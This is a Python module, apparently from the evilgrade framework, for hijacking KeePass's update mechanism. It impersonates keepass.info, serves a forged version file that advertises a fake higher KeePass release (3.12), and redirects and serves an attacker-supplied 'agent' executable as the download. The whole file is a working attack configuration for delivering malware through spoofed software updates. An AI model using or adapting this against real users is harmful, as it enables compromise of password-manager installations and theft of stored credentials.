from modules import ModuleBase


class KeePass(ModuleBase):
    name = 'keepass'
    version = '1.0'
    appver = 'All'
    author = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = """Keepass updater.""",
    vh = 'keepass.info' 
    requests = [
        {   'path': 'update/version2x.txt.gz',
            'type': 'string',
            'method': '',
            'bin': '0',
            'parse': '1',
            'file': '',
            'headers' : {'content-type': 'text/plain'},
            'string' : """
KeePass:<%VERSION%>
ArcFour Cipher Plugin:2.0.9
CodeWallet3ImportPlugin:1
DataBaseBackup:2.0.8.6
DataBaseReorder:2.0.8
EnableGridLines:1.1
eWallet Liberated Data Importer:0.12
IOProtocolExt:1.12
ITanMaster:2.28.0.2
KdbxLite:1.1
KeeAutoExec:1.8
KeeOldFormatExport:1
KeeResize:1.7
KPScript - Scripting KeePass:2.34
OnScreenKeyboard2:1.2
OtpKeyProv:2.4
PwGen8U:1
PwGenBaliktad:1.2
QR Code Generator:2.0.12
QualityColumn:1.2
Sample Plugin for Developers:2.0.9
SpmImport:1.2
WinKee:2.28.0.1
:""",
        },
        {   'path': 'sflogo\.php\?group_id=\d+&type=\d+',
            'type': 'redirect',
            'location': 'http://keepass.info/<%EXENAME%>.exe',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': '3.12',
            'desc': 'Version, has to be older than target. No more than 3 digits.'
        },
        'exename': {
            'val': 'KeePass-3.12',
            'desc': 'Zip name'
        },
    }

